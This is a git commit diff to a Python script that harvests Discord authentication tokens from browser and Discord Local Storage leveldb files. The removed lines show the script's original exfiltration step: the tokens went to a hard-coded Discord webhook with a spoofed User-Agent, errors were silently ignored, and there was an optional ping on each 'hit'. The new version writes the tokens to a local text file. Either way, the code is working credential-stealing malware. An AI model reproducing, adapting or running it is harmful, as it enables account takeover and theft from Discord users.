2d58dca2b4bef1243574b7636fe7e6ce5f83ecb0
UnrealNoodle <135469960+UnrealNoodle@users.noreply.github.com>
2023-06-17 22:25:50 +0400

    Update discord_token.py

--- discord_token.py
+++ discord_token.py
@@ -2,14 +2,6 @@ import os
 import re
 import json
 
-from urllib.request import Request, urlopen
-
-# your webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1116339688815464508/1_DFXDIh15XKmksLJIyTUE8d8xYKd0Fz3mxb9d9VKsBcfCof6qunsUxE9FyClaaFUcNp'
-
-# mentions you when you get a hit
-PING_ME = False
-
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
 
@@ -39,36 +31,26 @@ def main():
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
     }
 
-    message = '@everyone' if PING_ME else ''
+    output = ''
 
     for platform, path in paths.items():
         if not os.path.exists(path):
             continue
 
-        message += f'\n**{platform}**\n```\n'
+        output += f'\n**Discord Token**\n```\n'
 
         tokens = find_tokens(path)
 
         if len(tokens) > 0:
             for token in tokens:
-                message += f'{token}\n'
+                output += f'{token}\n'
         else:
-            message += 'No tokens found.\n'
+            output += 'No tokens found.\n'
 
-        message += '```'
+        output += '```'
 
-    headers = {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-    }
-
-    payload = json.dumps({'content': message})
-
-    try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
-        urlopen(req)
-    except:
-        pass
+    with open('discord_token.txt', 'w') as file:
+        file.write(output)
 
 if __name__ == '__main__':
     main()
